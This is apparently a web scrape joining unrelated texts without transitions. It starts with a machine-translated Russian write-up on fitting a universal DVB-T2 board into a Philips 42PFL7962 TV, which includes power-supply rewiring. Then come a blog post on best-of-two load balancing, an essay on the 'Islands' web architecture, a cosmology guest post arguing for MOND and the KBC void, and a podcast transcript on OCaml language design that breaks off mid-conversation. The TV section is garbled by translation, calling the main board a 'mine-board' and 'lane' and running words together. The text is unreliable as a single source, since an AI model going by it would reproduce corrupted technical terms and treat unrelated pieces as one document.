They offered me a cheap dead 42-inchPhilips 42PFL7962 TV set with the diagnosis “after a thunderstorm the mine-board burned down”. An autopsy revealed that the mine in it is not at all. Without thinking twice, I decided to put in it a universal mine-card with a DVB-T2 tuner, since the original part cannot compete either in price or in functionality. During installation, there were some difficulties associated with the power supply of the TV and its large diagonal, which I will try to describe in the review. <br><span id="more-1384"></span><br>
This board is perhaps the most popular of allbecause it accepts digital TV DVB-T2, and at the same time is quite cheap. Prices for a scaler without a number start at 700 rubles and, given that analog TV in Russia will soon completely disappear, it makes sense to order them only if used as a monitor. Scaler arrived very quickly, was ordered on October 10 and already on October 22 I took the package.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15265.png"><br>
The carton contains: a board, a remote control, a silicone case for it, an IR receiver and a small piece of wire with a connector for connecting it to the board, as well as instructions on A4 paper.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15268.jpg"><br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15271.jpg"><br>
The board is very compact, dimensions 180 * 40 mm. <br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15275.jpg"><br>
Additional Information<br>
</p><p>

Practically all connectors are located on the long side of the board: input for external power supply 12V, USB connector, HDMI input, VGA input, AV input, PC-Audio input, antenna input and headphone output.<br>

On the side there is a component input.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15288.jpg"><br>
On the back of the board is a sticker with information about the board.<br>

Preparing the lane for work<br>
One of the known problems of this board is strongCPU heat. Even before the first power up, it was decided to replace the “radiator”, glued to the process, with a more massive one. The small aluminum diffuser broke away from the processor almost effortlessly. Marking of the processor MSD3663LUA-Z1.<br>

Additional Information</p><p>

Wiring LVDS cable<br>
The PHILIPS 42PFL7962D TV uses the T420HW01 V.2 panel, the resolution is 1920 * 1080, 16.7 million colors, the supply voltage is 12V, the current consumption is 1A. Pinout and other technical data are in <a target="_blank" href="http://go.redlightgreen.org/redirect/cpa/o/pn2mxkz8nz4v07lyadx410a613pugos2?to=http%3A%2F%2Farchive.espec.ws%2Fsection1063%2Ffile29799.html&amp;key=ms&amp;s=msab.62ad69c">datasheet</a> on her.<br>
This is how the plug in the T-Con of the matrix looks like:<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15370.jpg"><br>
We paint the pinout of the matrix, the universal lane and correlate:<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15372.jpg"><br>
It is seen that the signal pairs of wires are made in the same color, which facilitates their search. Negative signal wires with a black stripe along. Find each pair and mark it. <br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15373.jpg"><br>
We also mark the power supply and "earth" wiring. Then we connect them with the corresponding pins on the connector. I regretted that I did not order the LVDS cable together with the card, since the TV cable has a different plug for connecting to the lane. I had to solder directly to the pins on the back of the board.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15375.jpg"><br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15377.jpg"><br>
In principle, the mine is ready for a performance check (it and the TV matrix). Install the matrix power supply jumper to 12V.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15379.jpg"><br>
We power the backlight separately from the native unitTV power, and lanes - from another small power supply unit, issuing 12 V. We connect the buttons and the IR receiver (left from another universal lane) and everything is ready.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15381.jpg"><br>
But before turning on our constructor, it is necessary to flash the board for the resolution of the matrix we need.<br>
Firmware</p><p>

Now that we have verified that the board is working, we need to bring the design to mind. <br>

The TV uses a power supply <a target="_blank" href="http://go.redlightgreen.org/redirect/cpa/o/pn2mxkz8nz4v07lyadx410a613pugos2?to=http%3A%2F%2Ftel-spb.ru%2Ffiles%2Fphilips_plcd300p3.rar&amp;key=ms&amp;s=msab.3703560">PLCD300P3</a> 170 W. It provides 3 supply voltages: 5.2V, 12V and 24V. And then I ran into some of the nuances. One of them is that when turned on, the power supply unit produces only one voltage of 5.2V. A 12 and 24 volts appear when the light signal turns on the BLON illumination from the lane. And, as you know, the mine is powered by 12V. It turns out that we can not power the universal board from this power supply?<br>
In fact, the universal mine can eatfrom 5 volts. 12 V is only used when a 12-volt matrix is ​​connected to it. Next are stabilizers 5V, 3.3V and 1.8V, which feeds the processor board. So, the lane can be powered from 5V in case the matrix supply voltage is 5 or 3.3 V. Here, only the lane does not have a connector for connecting to 5 Volt directly. It is necessary to solder the supply wiring to the electrolytic capacitor, which stands after the 5V - stabilizer (on this board it is ECW53).<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15389.jpg"><br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15391.jpg"><br>
We are convinced of the performance of this design (the blue LED is on, responds to the commands of the console).<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15394.jpg"><br>
However, now it is not possible to power the 12-voltlane matrix. Therefore, we connect the matrix to the output 12V of the power supply. After all, as you know, these same 12V will appear only after the activation signal from the mine. This is just what you need.<br>
We unsolder the power supply wires from the lane (connect to pin 1 and 2) and solder to the connector of the power supply.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15395.jpg"><br>
This matrix power supply has anotheradvantage. As indicated above, the current flowing through the matrix is ​​about 1A. Which is too much for a tiny SMD transistor on the lane that opens up power to it. He withstood the first few inclusions, but who knows how much is enough for him. (I read about this issue somewhere on the forums, as an option - to replace the transistor on the universal lane with a more powerful one). <br>
The overall power scheme of the TV looks like this:<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15397.png"><br>
Voltage 5V is constantly supplied to the main-board,when switched on, the BLON + 5V signal comes from the duty mode from the lane to the power supply unit, which opens the + 12V supply to the matrix and + 24V to the backlight. And here there was another snag.<br>
The fact is that the power supply has an on signalSTBY is inverse, that is, the power of the backlight and the matrix appears after the pin of STBY closes to ground. Here is the section of the power supply circuit that is responsible for this signal.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15399.png"><br>
When a low level signal is applied to the STBY pin(when it is shorted to ground), the T101 transistor opens, power is supplied to the LED of the optocoupler U101, which starts the PWMs that form 12 and 24 V. If you send + 5V from the lane to STBY, nothing will happen, the transistor will not open. So, it is necessary to modify the circuit so that the LED of the optocoupler lights up when a high level signal is applied from the lane. To do this, I added another key on the npn transistor, and the scheme began to look like this:<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15401.png"><br>
The key connects to the gap between pin 2optocouplers and ground. In this case, the base of the transistor U101 closes to ground. Thus, T101 is constantly open, and KT503 opens when a high level signal (+ 5V) is applied to its base, lighting the LED of the optocoupler. You can use any npn transistor, and calculate the divider so that the voltage between the base and the emitter is at least 2 times lower than the limit on the datasheet. With two identical resistors, it turns out to be +2.5 V. The key is assembled on a small board and glued to hot-melt adhesive on the power supply.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15402.jpg"><br>
Now, you can put everything together in a package.tv set The power supply unit has risen to a regular place. For the universal lane I marked out holes on the metal substrate on which the old mine-board was located, and secured the stands.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15405.jpg"><br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15407.jpg"><br>
A board with an IR receiver and a LED from anotherI fixed the TV on a hot-melt glue, the distances between the windows for them coincided, and there were too many active elements on the motherboard, and I didn’t want to mess around with the wiring. The buttons are left native, but since they are paralleled, all 6 buttons are connected to pin 6, that is, you can turn on or off any of these 6 buttons in standby mode. <br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15410.jpg"><br>
View of the TV assembly without the back cover:<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15413.jpg"><br>
On the back cover did not make any cuts, onlyremoved the metal casing covering the lane from the side of the connectors and from above, to access the side AV connectors. The board turned out to be slightly recessed inside the case, all because of the short LVDS cable, but this does not interfere with access to the inputs.<br>

We turn on, and first of all we turn on autotune of channels. You can configure analog and digital TV separately, and select the desired region.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15421.jpg"><br>
Autotune goes for a long time, about 10 minutes. A dozen kilometers from the TV tower to the active antenna were found all the analog and digital channels that are available. <br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15422.jpg"><br>
The quality of digital images, of course, does not compare with the analog, although all digital channels broadcast in 576r.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15424.jpg"><br>

<p>Using less information to make better decisions.</p>


<p>In many large-scale web services, multiple layers of stateless and stateful services are seperated by load balancers. Load balancing can be done with dedicated hardware, with dedicated software load balancers, using DNS trickery or through a load-balancing mechanism in the client. In large systems, the resources and constraints at each layer can vary widely. Some layers are stateless, and easily scale horizontally to many machines. Other layers may be more constrained, either due to the need to access state or contention for some other shared resource.</p>

<p>Centralized load balancing solutions can distribute load over a fleet of machines very well. They track the amount of load they are sending to each machine (usually based on a simple measurement like connection count). Because they are centralized, load balancers typically don't need to worry about load sent from other sources. They have complete control over the distribution of load.</p>

<p>Despite this advantage, dediced load balancers are often undesirable. They add cost, latency, complexity, and may introduce a single point of failure. Handing the task of load balancing to each upstream client is also possible, but introduces the challenge of fairly balancing the load from multiple places. In large systems with large numbers of clients and fairly homogeneous calls, a purely random system like DNS round robin can work very well. In smaller systems, systems where each downstream service can only handle a small number or concurrent requests, and systems where requests are heterogeneous it's often desirable to load balance better than random.</p>

<p>Perfect distributed load balancing could be done, at least in the happy case, by distributing information about system load across all the clients. The overhead of constantly sharing the exact load information between different sources can be high, so it's tempting to have each source work off a cached copy. This data can periodically be refreshed from downstream, or from other clients.</p>

<p>It turns out that's not a great idea.</p>

<p>In <a href="http://www.eecs.harvard.edu/~michaelm/postscripts/handbook2001.pdf">The Power of Two Random Choices: A Survey of Techniques and Results</a>, Mitzenmacher et. al. survey some research very relevant to this problem. The entire survey is good reading, but one of the most interesting results is about the effects of delayed data (like the cached load results mentioned above) on load balancing. The results are fairly logical in retrospect, but probably don't match most engineers' first expectations.</p>

<p>Using stale data for load balancing leads to a herd behavior, where requests will herd toward a previously quiet host for much longer than it takes to make that host very busy indeed. The next refresh of the cached load data will put the server high up the load list, and it will become quiet again. Then busy again as the next herd sees that it's quiet. Busy. Quiet. Busy. Quiet. And so on.</p>

<p>One possible solution would be to give up on load balancing entirely, and just pick a host at random. Depending on the load factor, that can be a good approach. With many typical loads, though, picking a random host degrades latency and reduces throughput by wasting resources on servers which end up unlucky and quiet.</p>

<p>The approach taken by the studies surveyed by Mitzenmacher is to try two hosts, and pick the one with the least load. This can be done directly (by querying the hosts) but also works surprisingly well on cached load data.</p>

<p>To illustrate how well this works, I ran a simulation of a very simplistic system. Every second one request arrives at a system with 10 servers. Every 8 seconds the oldest request (if any) is removed from the queue on the servers. Load balancing is done with a cached copy of the server queue lengths, updated every N seconds. I considered four approaches: chose a random server, chose the best server, best of two random choices and best of three random choices.</p>

<p><img src="https://s3.amazonaws.com/mbrooker-blog-images/mbrooker_best_of_two_result.png" alt=""></p>

<p>As you can expect, the <em>pick the best</em> approach worked best when perfect undelayed information was available. In the same case, the random pick approach worked poorly, leading to the worst queue times of any of the approaches. As the age of the data increases, the <em>pick the best</em> approach becomes worse and worse because of herding and soon overtakes the random approach as the worst one.</p>

<p><em>Best of 3</em> starts in second place, and puts in a good performance. It gains first place, only to cede it to <em>best of 2</em> as the delay increases. Clearly, the behavior for <em>best of k</em> will approach the behavior of <em>best</em> as k approaches the number of servers. <em>Best of 2</em> remains the strong leader all the way to the end of this simulation. Given these parameters it would start losing to the random approach around a refresh interval of 70. It is the clear leader for intervals over the range from 10 to 70, which is an impressive performance for such a simple approach.</p>

<p><em>Best of 2</em> is good because it combines the best of both worlds: it uses real information about load to pick a host (unlike random), but rejects herd behavior much more strongly than the other two approaches.</p>

<p>Take a look at <a href="http://www.eecs.harvard.edu/~michaelm/postscripts/handbook2001.pdf">The Power of Two Random Choices</a> for a much stronger mathematical argument, and some more surprising places this algorithm works really well.</p>

        <section>
            <p><img src="https://res.cloudinary.com/wedding-website/image/upload/c_scale,w_2400/v1597095361/krzysztof-grech-6orUY98fw9s-unsplash_r6wjnf.jpg"></p>



<p>I’ve struggled to find references to this online, but heard the name used multiple times this year when describing the approach outlined here.</p>

<p>The general idea of an “Islands” architecture is deceptively simple: render HTML pages on the server, and inject placeholders or slots around highly dynamic regions. These placeholders/slots contain the server-rendered HTML output from their corresponding widget. They denote regions that can then be "hydrated" on the client into small self-contained widgets, reusing their server-rendered initial HTML.</p>

<p>You can think of this like a static HTML document that contains multiple separate embedded applications:</p>

<p>  
<img width="600" src="https://res.cloudinary.com/wedding-website/image/upload/v1596766231/islands-architecture-1.png">  
</p>

<p>This may seem similar to "micro-frontends" at first glance. Both approaches share the idea of breaking applications up into independent units, however "micro-frontends" do not typically imply that composition of those units is achieved using HTML.</p>

<p>A closer analog to the "islands" approach would be progressive enhancement, to which we're essentially adding SSR hydration and a consistent metaphor for adding interactivity to a region of the page. In traditional progressive enhancement, we might have a <code>&lt;script&gt;</code> that looks for an image carousel in the page and instantiates a jQuery plugin on it. Instead, that image carousel would be rendered on the server and a dedicated <code>&lt;script&gt;</code> emitted for it that loads the image carousel implementation and in-place upgrades it to be interactive.</p>

<h3 id="whydoesthismatter">Why does this matter?</h3>

<p>As it turns out, there are a number of benefits to the group of approaches described here when compared to typical Single Page Application architectures.</p>

<h5 id="progressivehydrationforfree">"Progressive Hydration" for free</h5>

<p>I’ve touted the performance benefits of <a href="https://www.youtube.com/watch?v=k-A2VfuUROg">Progressive Hydration</a> techniques for frameworks like React, Angular, Preact and Vue. With these architectures, individual widgets on a page are loaded and initialized over time. This can be done using a simple scheduling approach via requestIdleCallback, or can take additional factors into account like viewport visibility, interaction likelihood, product value, etc.</p>

<p>Similar to Progressive Hydration, rendering pages using an islands architecture results in the heavier dynamic portions of the page being initialized not just progressively, but <em>separately</em>. This means individual regions of the page become interactive without anything else on the page needing to be loaded first.</p>

<p>Unlike Progressive Hydration, the approaches that fall out of building around an islands architecture do not require top-down rendering. This is a distinct advantage, since there are no outer “root” components that must be initialized before their descendants. Each part of the page is an isolated unit, and a performance issue in one unit doesn't affect the others.</p>

<h5 id="seoanduxarentatradeoff">SEO and UX aren’t a tradeoff</h5>

<p>The status quo for SSR as used by Single Page Applications is that it’s often cited as a necessity for SEO reasons. However, SSR can actually have a net <em>negative</em> impact on User Experience - visitors are left waiting for the actual functionality of a page to arrive while staring at a frustratingly fake version of that page.</p>

<p>Many applications also suffer from silent SSR performance pitfalls without realizing it. In virtual DOM libraries, it's easy (and common) to accidentally construct a situation where first render destroys the server-rendered HTML DOM, only to recreate it again from scratch (often synchronously). This is the result of some common misconceptions, which may stem from documentation giving an idealized view of hydration while passing over tricky caveats and footguns.</p>

<p>Even in cases where SSR hydration is functioning as designed, the status quo leaves a lot to be desired. The amount of JavaScript work being performed during page load is still many orders of magnitude more than what might be considered "efficient".</p>

<figcaption><a href="https://unsplash.com/photos/NYVc84Gh78I" target="_blank">Photo by Dave Hoefler</a></figcaption>  
</figure>

<p>In an "islands" model, server rendering is not a bolt-on optimization aimed at improving SEO or UX. Instead, it is a fundamental part of how pages are delivered to the browser. The HTML returned in response to navigation contains a meaningful and immediately renderable representation of the content the user requested.</p>

<p>Sections of that HTML may be missing their client-side interactivity, but the document should at least contain the most essential content. For example: a news page’s HTML would contain the article body, and a product page would contain that product’s description.</p>

<p>All of the other content is secondary to this information, and its inclusion in the HTML becomes a product decision. How vital is this bit of information to a user visiting the page? How important is that widget to the business model? A "buy now" button that directly relates to revenue should be easily prioritized over a site feedback survey button that relates to information gathering.</p>

<h5 id="betterforaccessibilityanddiscoverability">Better for accessibility and discoverability</h5>

<p>A website that uses standard HTML links for navigation is easier for assistive technologies and web crawlers to use. This is true regardless of whether links or forms are intercepted by JavaScript and rerouted to client-side logic, because the underlying assumptions remain true: clicking a link navigates to the given page.</p>

<p>Anecdotally, think of the number of times you’ve been sent a “link” to what the sender assumed was the page they were viewing, only to realize the link contained none of the necessary information:</p>

<p>  
<img width="350" src="https://res.cloudinary.com/wedding-website/image/upload/v1596766231/islands-architecture-3.png">  
</p>

<p>Building page-based applications doesn't completely prevent these types of strange experiences, it only makes the decision to do so more direct. It makes the default outcome the accessible one.</p>

<hr>

<p>When it comes down to it, shipping an architecture that requires less code to do something is the type of long-term benefit your future self (or coworkers) will thank you for. It's possible — likely, even — that adopting a model like this requires more up-front design thinking. There are far few batteries-included options available for decomposing apps into independently deliverable widgets. Who knows, maybe we can fix that.</p>

<p>The following is a guest post by Indranil Banik, Moritz Haslbauer, and Pavel Kroupa (bios at end) based on their new paper</p>



<h3><strong><a href="https://dx.doi.org/10.1093/mnras/staa2348" target="_blank" rel="noreferrer noopener"><em>Modifying gravity to save cosmology</em></a></strong></h3>



<p>Cosmology is currently in a major crisis because of <a rel="noreferrer noopener" href="https://doi.org/10.3390/universe6080107" target="_blank">many severe tensions</a>, the most serious and well-known being that local observations of how quickly the Universe is expanding (the so-called ‘Hubble constant’) exceed the prediction of the standard cosmological model, ΛCDM. This prediction is based on the cosmic microwave background (CMB), the most ancient light we can observe – which is generally thought to have been emitted about 400,000 years after the Big Bang. For ΛCDM to fit the pattern of fluctuations observed in the CMB by the Planck satellite and other experiments, the Hubble constant must have a particular value of 67.4 ± 0.5 km/s/Mpc. Local measurements are nearly all above this ‘Planck value’, but are consistent with each other. In our paper, we use a local value of 73.8 ± 1.1 km/s/Mpc using a combination of supernovae and gravitationally lensed quasars, two particularly precise yet independent techniques.</p>



<p>This unexpectedly rapid local expansion of the Universe could be due to us residing in a huge underdense region, or void. However, a void wide and deep enough to explain the Hubble tension is not possible in ΛCDM, which is built on Einstein’s theory of gravity, General Relativity. Still, there is quite strong evidence that we are indeed living within a large void with a radius of about 300 Mpc, or one billion light years. This evidence comes from many surveys covering the whole electromagnetic spectrum, from radio to X-rays. The most compelling evidence comes from analysis of galaxy number counts in the near-infrared, giving the void its name of the <a rel="noreferrer noopener" href="https://doi.org/10.1088/0004-637X/775/1/62" target="_blank">Keenan-Barger-Cowie (KBC) void</a>. Gravity from matter outside the void would pull more than matter inside it, making the Universe appear to expand faster than it actually is for an observer inside the void. This ‘Hubble bubble’ scenario (depicted in Figure 1) could solve the Hubble tension, a possibility considered – and rejected – in several previous works (e.g. <a href="https://doi.org/10.3847/1538-4357/ab0ebf" target="_blank" rel="noreferrer noopener">Kenworthy+ 2019</a>). We will return to their objections against this idea.</p>

<p>One of the main objections seemed to be that since such a large and deep void is incompatible with ΛCDM, it can’t exist. This is a <a rel="noreferrer noopener" href="http://astroweb.case.edu/ssm/mond/LCDMMONDflowchart.png" target="_blank">common way of thinking</a>, but the problem with it was clear to us from a very early stage. The first part of this logic is sound – assuming General Relativity, a hot Big Bang, and that the state of the Universe at early times is apparent in the CMB (i.e. it was flat and almost homogeneous then), we are led to the standard flat ΛCDM model. By studying the largest suitable simulation of this model (called MXXL), we found that it should be completely impossible to find ourselves inside a void with the observed size and depth (or fractional underdensity) of the KBC void – this possibility can be rejected with more confidence than the discovery of the Higgs boson when first announced. We therefore applied one of the leading alternative gravity theories called Milgromian Dynamics (<a rel="noreferrer noopener" href="http://dx.doi.org/10.1086/161130" target="_blank">MOND</a>), a controversial idea developed in the early 1980s by Israeli physicist Mordehai Milgrom. We used MOND (<a rel="noreferrer noopener" href="http://astroweb.case.edu/ssm/mond/" target="_blank">explained in a simple way here</a>) to evolve a small density fluctuation forwards from early times, studying if 13 billion years later it fits the density and velocity field of the local Universe. Before describing our results, we briefly introduce MOND and explain how to use it in a potentially viable cosmological framework. Astronomers often assume MOND cannot be extended to cosmological scales (typically &gt;10 Mpc), which is probably true without some auxiliary assumptions. This is also the case for General Relativity, though in that case the scale where auxiliary assumptions become crucial is only a few kpc, namely in galaxies.</p>



<p>MOND was originally designed to explain why galaxies rotate faster in their outskirts than they should if one applies General Relativity to their luminous matter distribution. This discrepancy gave rise to the idea of dark matter halos around individual galaxies. For dark matter to cluster on such scales, it would have to be ‘cold’, or equivalently consist of rather heavy particles (above a few thousand eV/c<sup>2</sup>, or a millionth of a proton mass). Any lighter and the gravity from galaxies could not hold on to the dark matter. MOND assumes these speculative and unexplained cold dark matter haloes do not exist – the need for them is after all dependent on the validity of General Relativity. In MOND once the gravity from any object gets down to a certain very low threshold called a<sub>0</sub>, it declines more gradually with increasing distance, following an inverse distance law instead of the usual inverse square law. MOND has successfully predicted many galaxy rotation curves, highlighting some remarkable correlations with their visible mass. This is unexpected if they mostly consist of invisible dark matter with quite different properties to visible mass. The Local Group satellite galaxy planes also strongly favour MOND over ΛCDM, as explained using the logic of Figure 2 and in <a rel="noreferrer noopener" href="https://www.youtube.com/watch?v=PYVC0VtmpDg" target="_blank">this YouTube video</a>.</p>

These are difficult to form unless the galaxies in them are tidal dwarfs born from the interaction of two major galaxies. Since tidal dwarfs should be free of dark matter due to the way they form, the satellites in the satellite planes should have rather weak self-gravity in ΛCDM. This is not the case as measured from their high internal velocity dispersions. So the extra gravity needed to hold galaxies together should not come from dark matter that can in principle be separated from the visible.</figcaption></figure>



<p>To extend MOND to cosmology, we used what we call the νHDM framework (with ν pronounced “nu”), originally proposed by <a rel="noreferrer noopener" href="https://doi.org/10.1111/j.1365-2966.2008.14341.x" target="_blank">Angus (2009)</a>. In this model, the cold dark matter of ΛCDM is replaced by the same total mass in sterile neutrinos with a mass of only 11 eV/c<sup>2</sup>, almost a billion times lighter than a proton. Their low mass means they would not clump together in galaxies, consistent with the original idea of MOND to explain galaxies with only their visible mass. This makes the extra collisionless matter ‘hot’, hence the name of the model. But this collisionless matter would exist inside galaxy clusters, helping to explain unusual configurations like the Bullet Cluster and the unexpectedly strong gravity (even in MOND) in quieter clusters. Considering the universe as a whole, νHDM has the same overall matter content as ΛCDM. This makes the overall expansion history of the universe very similar in both models, so both can explain the amounts of deuterium and helium produced in the first few minutes after the Big Bang. They should also yield similar fluctuations in the CMB because both models contain the same amount of dark matter. These fluctuations would get somewhat blurred by sterile neutrinos of such a low mass due to their rather fast motion in the early Universe. However, it has been demonstrated that Planck data are consistent with dark matter particles more massive than 10 eV/c<sup>2</sup>. Crucially, we showed that the density fluctuations evident in the CMB typically yield a gravitational field strength of 21 a<sub>0</sub> (correcting an earlier erroneous estimate of 570 a<sub>0</sub> in the above paper), making the gravitational physics nearly identical to General Relativity. Clearly, the main lines of early Universe evidence used to argue in favour of ΛCDM are not sufficiently unique to distinguish it from νHDM (<a rel="noreferrer noopener" href="https://doi.org/10.1111/j.1365-2966.2008.14341.x" target="_blank">Angus 2009</a>).</p>



<p>The models nonetheless behave very differently later on. We estimated that for redshifts below about 50 (when the Universe is older than about 50 million years), the gravity would typically fall below a<sub>0</sub> thanks to the expansion of the Universe (the CMB comes from a redshift of 1100). After this ‘MOND moment’, both the ordinary matter and the sterile neutrinos would clump on large scales just like in ΛCDM, but there would also be the extra gravity from MOND. This would cause structures to grow much faster (Figure 3), allowing much wider and deeper voids.</p>

<p>We used this basic framework to set up a dynamical model of the void.

We also confirmed previous results that the same observables rule out standard cosmology at 7.09σ significance. This is much more than the typical threshold of 5σ used to claim a discovery in cases like the Higgs boson, where the results agree with prior expectations.</p>

		<h2 id="000000">00:00:00</h2>

<div><p>Welcome to Signals And Threads, in-depth conversations about every layer of the tech stack from Jane Street. I’m Ron Minsky. </p><p> Today, we’re going to have a conversation about programming language design with Leo White. Leo works in our compilers team here at Jane Street, and he works mostly on what’s called the frontend of the compiler, which means he spends a lot of time thinking about language features and about the type system that supports those language features, and in particular, he does that work in OCaml, which is the programming language we use on a day-to-day basis. </p><p> So, Leo, to get started, I’m curious, can you tell us a little bit about how you got involved in all of this? How you got involved in programming language design, in the first place?</p></div>

<h2 id="0000400">00:00:40.0</h2>

<div><p>I had some interest in programming languages from a young age. I started programming at 11 or something, and then I think I was fairly interested in how these mysterious things were created. The most formative thing I can think of in this regard, is between my first and second years at university, I remember reading Benjamin Pierce’s <a href="https://www.cis.upenn.edu/~bcpierce/tapl/"><em>Types and Programming Languages</em></a>. That really clicked. I just thought that stuff was great and I just really wanted work on it, and explore those ideas. </p><p> So, I think that’s kind of one of the main things that got me into it. I knew I wanted to do some programming language stuff, I started doing a PhD in that area. It was more about compilation than programming language design, and I was working on a source-to-source C compiler, and I was writing that compiler in OCaml, because OCaml had a good library for reading C files, and I already knew Standard ML, because it’s what they teach you in the first year at Cambridge. So, anyways, I was using OCaml to write this compiler, and I realized that there was a language feature that I wanted to have that would make it easier for me to write this C compiler, and since I kind of hated the work I was doing on the C compiler and was not that interested in it, I procrastinated by adding this feature to OCaml instead. And that’s kind of how I got into writing code for the OCaml compiler. So, I was writing, this language feature and went through the process of trying to upstream it, and whilst I was doing that and my PhD was coming to an end, Anil Madhavapeddy was looking around for people to join OCaml Labs, which was this new project to work on the OCaml compiler that Jane Street was kind of funding in Cambridge. So, he was trying to look for people to work on the OCaml compiler and suddenly this Cambridge address shows up with the implementing language features for OCaml and so he thought, well, I should go and see this person. So, he got in touch with me. And that’s kind of how I started working at OCaml Labs as an RA after having finished my PhD.</p></div>

<h2 id="0002195">00:02:19.5</h2>

<p>It’s by the way worth noting that most people have the wisdom to not immediately go and dive into adding features to languages that they’re just starting to use, and in particular, diving into the type system. I think when Anil saw someone who was willing to just going in and add a new type system feature, he was pretty excited.</p>

<h2 id="0002346">00:02:34.6</h2>

<p>Yes. I did not realize at the time that this wasn’t something that you just did. Yes, I was somewhat under-supervised in my PhD and clearly, no one told me that this is a terrible idea, and a bad way to spend your time. So, I just went ahead and did it instead, and I really enjoyed it. I mean, it’s quite a terrible…like, the type system is hard to dive into. I would not recommend doing it without some assistance.</p>

<h2 id="0002568">00:02:56.8</h2>

<p>The thing you mentioned about how you got involved in OCaml, is the thing that’s always worried me a little bit about how languages are designed, which is to say, languages are almost inevitably designed by people who write compilers, and so, they go around and look at the features they would like for writing compilers and go ahead and add them to the language, and I always wondered, like, how much of a bias is this in how our languages are designed?</p>

<h2 id="0003178">00:03:17.8</h2>

<p>I would say, not much of one mostly, because that is probably a fair accusation of OCaml, which is very nice for writing compilers and has all the things you would want for writing a compiler, but that is not true of most languages. Most languages are kind of horrible to write compilers in, so I don’t think it’s applying there.</p>

<h2 id="0003327">00:03:32.7</h2>

<p>So, you got excited about programming language design from reading <em>Types and Programming Languages</em>, which is Benjamin Pierce’s extremely famous book in this area, or at least extremely famous in an extremely narrow group of people, and you’ve been doing it now for quite a while. Some of that work during your PhD. Some at OCaml Labs, and a bunch of it here, in the intermediate time. What do you find exciting about language design? Why do you like it?</p>

<h2 id="0003550">00:03:55.0</h2>

<p>One of the main things I think I like about language design is that it sits at an interesting intersection between some very interesting pure mathematics, especially on the type system design side of things, and a more aesthetic, kind of, design style. A lot of it is about trying to find things that fit within the mathematical constraints, but are also a design that people like aesthetically and enjoy using.</p>

<h2 id="0004166">00:04:16.6</h2>

<p>And this is one of the real challenges of programming language design. It is really not, at its heart, a scientific enterprise, or at least, not at the end. This is a thing you often hear programming language people complain about, is the fact that they can’t do any proper studies, or rather, whether they can or can’t do it, that in practice, that is not how the field is driven.</p>

<h2 id="0004365">00:04:36.5</h2>

<p>Some people do try and do studies in how effective a programming language is, but it kind of hits up against all the things that make it hard to do experiments in the social sciences. It’s just seems like, in principle, you can manage it, but the experiments are just very hard to do, right? What you really need to do is get a load of professional programmers to agree to use all these different languages to solve the same problems for a prolonged period of time, and clearly this isn’t going to happen.</p>

<h2 id="0004566">00:04:56.6</h2>

<p>Yeah, it does seem completely and utterly hopeless to me because, if the things you care about are what you can do in a programming language, with large groups of people, solving hard problems, with significant amounts of time being devoted to it, which seems like, to me, at least, the interesting problem, and I think, a problem that a lot of programming languages are not even motivated by, you just have no hope. Like the kind of experiments people can run in practice, are like, they grab the thing they have at hand, which is usually a collection of sophomores, and then they study the thing that they can, which is something like how easy is it to understand the very first errors they see in their language or like, how well do they do when they try and do stuff in their first few weeks or maybe few months of working at it. And that just doesn’t get at the actual thing you care about when you think about what makes programming effective in the real world.</p>

<h2 id="0005434">00:05:43.4</h2>

<div><p>This kind of genuinely bothers quite a lot of people, I think, who work in programming languages. They really would much prefer that it were a proper science. It’s much better thought of as a kind of intersection between some mathematics and design. </p><p> And those are both things that we know how to study, right? The scientific method is not the only approach to knowledge. With mathematics, you can try to prove useful theorems and interesting properties, and people successfully do research in design disciplines like, my favorite example is really architecture, which I think is a very similar area to programming language design, in that it’s kind of constrained by mathematics. You know, you have to make sure the building stays up and also, is interesting from a design perspective. You know, you want to make buildings that people enjoy being in and looking at, and so on.</p></div>

<h2 id="0006249">00:06:24.9</h2>

<p>And there’s more than just the raw structural things you have to check. When you think about the design of a building, you think about what are transit times, and people do all sorts of studies to try get feels for how effective it is, but in the end, no one thinks that the final way to figure out whether a building is good is to do a randomized control trial, where you’re like, you make four different buildings and you have this, this and this. You have four equivalent businesses that you sit in the four different buildings and you see how it goes. And I think the scale of the economic investment required, I’m not sure if it’s not quite as absurd or a little more absurd to do the programming language equivalent, but it’s up there.</p>

<h2 id="0007013">00:07:01.3</h2>

<p>I think that that’s a better way of looking at programming language design, as a discipline.</p>

<h2 id="0007068">00:07:06.8</h2>

<p>You know, there are two ways of handling design problems. One is, you can solve them in the market, right? You can, you know, go off and have people go and design programming languages and see which are successful, and we have that down. There’s a whole system for doing that. And then there’s an academic equivalent of this, and a lot of the work on OCaml, in particular, happens in a context which includes a lot of academic staff. Do you have a feel for how you would make things like evaluation of papers different than it is now in order to accommodate for this?</p>

<h2 id="0007335">00:07:33.5</h2>

